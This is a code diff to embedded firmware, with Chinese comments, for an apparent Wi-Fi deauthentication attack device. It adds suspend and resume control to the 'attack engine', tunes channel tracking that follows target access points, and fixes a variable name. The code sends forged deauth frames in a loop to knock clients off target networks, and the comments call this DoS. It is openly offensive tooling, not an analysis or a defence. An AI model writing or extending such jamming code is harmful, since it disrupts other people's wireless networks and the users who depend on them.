@@ -11,6 +11,7 @@
 #include "ap_powersave.h"
 #include "settings.h"
 #include "wifi_drv.h"
+#include "wdt_api.h"
 
 #include "FreeRTOS.h"
 #include "timers.h"
@@ -24,9 +25,9 @@ extern "C" {
 #define ATTACK_BOOT_HOLD_SEC 30  // 开机延迟 30 秒执行攻击（出bug时不至于拖 SoftAP 下水）
 #define ATTACK_ROUND_PACKETS 4      // 每个目标每轮发包数（与 test-deauth 一致）
 // === 目标 AP 信道跟踪配置 ===
-#define CH_TRACK_INTERVAL_SEC     600   // 两次核查最小时间间隔(s)
-#define CH_TRACK_LISTEN_MS        500   // 核查阶段：在当前信道监听 Beacon 的驻留时间（ms）
-#define CH_TRACK_SCAN_DWELL_MS    250   // 搜寻阶段：每个候选信道的驻留时间（ms）
+#define CH_TRACK_INTERVAL_SEC     300   // 两次核查最小时间间隔(s)
+#define CH_TRACK_LISTEN_MS        550   // 核查阶段：在当前信道监听 Beacon 的驻留时间（ms）
+#define CH_TRACK_SCAN_DWELL_MS    450   // 搜寻阶段：每个候选信道的驻留时间（ms）
 
 // 引擎状态（统计与运行标志不落盘）
 static volatile bool g_attack_running = false;
@@ -35,6 +36,7 @@ static uint8_t g_start_channel = 1;  // 攻击启动时信道，停止时恢复
 static uint32_t g_attack_rounds = 0;
 static uint32_t g_attack_packets = 0;
 static bool s_boot_resume_pending = false;
+static volatile int s_attack_suspend_count = 0; // 挂起嵌套计数（>0 时挂起攻击任务）
 
 // === 信道跟踪状态 ===
 static uint32_t g_last_track_ms = 0;            // 上次核查时间戳（millis）
@@ -82,7 +84,8 @@ static void minimalRadioWake() {
     if (wifi_disable_powersave() != RTW_SUCCESS) {
         Serial.println("[ATTACK] minimal wake: wifi_disable_powersave failed");
     }
-    delay(5);
+    // 睡眠前即使切换到非1的信道，恢复后还是1信道
+    ap_channel = 1;
 }
 
 static void minimalRadioSleep() {
@@ -99,6 +102,7 @@ static void sendBurstForChannel(uint8_t ch) {
             // 伪造客户端单方向往 AP 发 deauth（DoS），与 test-deauth 相同帧方向
             wifi_tx_deauth_frame_ext(t.mac, t.bssid, t.bssid, 0x03);
             g_attack_packets++;
+            // 不用delay，单片机sdk会处理好
         }
     }
 }
@@ -119,7 +123,7 @@ static void runAttackRound() {
         }
         if (!dup) channels[channel_count++] = ch;
     }
-
+    // 执行攻击发包
     for (int c = 0; c < channel_count; c++) {
         if (switchChannel(channels[c])) {
             sendBurstForChannel(channels[c]);
@@ -189,6 +193,11 @@ void attackerInit() {
 }
 
 void attackerTick() {
+    // 处于挂起保护中时（如正在扫描、OTA升级、执行单次操作），跳过发包
+    if (attackerIsSuspended()) {
+        return;
+    }
+
     if (s_boot_resume_pending) {  // 开机保护期倒计时
         if (millis() >= (uint32_t)ATTACK_BOOT_HOLD_SEC * 1000) {
             s_boot_resume_pending = false;
@@ -209,8 +218,11 @@ void attackerTick() {
     runAttackRound();
 }
 
-// 距离下次开火毫秒数；未启用/无目标返回 UINT32_MAX；已到点返回 0
+// 距离下次开火毫秒数；未启用/无目标/挂起返回 UINT32_MAX；已到点返回 0
 uint32_t attackerMsUntilNextFire() {
+    if (attackerIsSuspended()) {
+        return UINT32_MAX;
+    }
     if (s_boot_resume_pending) {
         uint32_t hold_ms = (uint32_t)ATTACK_BOOT_HOLD_SEC * 1000;
         uint32_t now = millis();
@@ -226,10 +238,47 @@ bool attackerIsRunning() {
     return g_attack_running;
 }
 
+void attackerSuspend() {
+    taskENTER_CRITICAL();
+    s_attack_suspend_count++;
+    taskEXIT_CRITICAL();
+    if (s_attack_suspend_count == 1) {
+        Serial.println("[ATTACK] Engine suspended by active operation");
+    }
+}
+
+void attackerResume() {
+    bool reach_zero = false;
+    taskENTER_CRITICAL();
+    if (s_attack_suspend_count > 0) {
+        s_attack_suspend_count--;
+        reach_zero = s_attack_suspend_count == 0;
+    }
+    taskEXIT_CRITICAL();
+    
+    if (reach_zero) {
+        // 恢复时给予缓冲时间，避免刚退出长任务就立即并发开火
+        uint32_t interval = g_appSettings.attack_interval_ms;
+        if (interval < 2000) interval = 2000;
+        g_next_fire_ms = millis() + interval;
+        g_last_track_ms = millis();
+        // 同步当前 SoftAP 所在信道
+        g_start_channel = ap_channel;
+        Serial.print("[ATTACK] Engine resumed, next fire in ");
+        Serial.print(interval);
+        Serial.println(" ms");
+    }
+}
+
+bool attackerIsSuspended() {
+    return s_attack_suspend_count > 0;
+}
+
 void handleAttackStatusApi(HttpClient& client) {
     JsonDocument doc;
     doc["success"] = true;
     doc["enabled"] = g_attack_running;
+    doc["suspended"] = attackerIsSuspended();
     doc["type"] = (g_appSettings.attack_type == ATTACK_TYPE_DEAUTH) ? "deauth" : "unknown";
     doc["interval_sec"] = g_appSettings.attack_interval_ms / 1000.0;
     doc["ap_powersave_enabled"] = (g_appSettings.ap_powersave_enable == 1);
@@ -550,11 +599,12 @@ static void runChannelTrack() {
 
             if (listenForBeacon(bssids[b], scan_ch, CH_TRACK_SCAN_DWELL_MS)) {
                 Serial.print("[ATTACK] Channel tracking: AP found on CH");
-                Serial.println(g_track_beacon_found);
-                updateTargetChannel(bssids[b], g_track_beacon_found);
+                Serial.println(g_track_found_channel);
+                updateTargetChannel(bssids[b], g_track_found_channel);
                 found = true;
                 break;
             }
+            watchdog_refresh();
         }
 
         if (!found) {
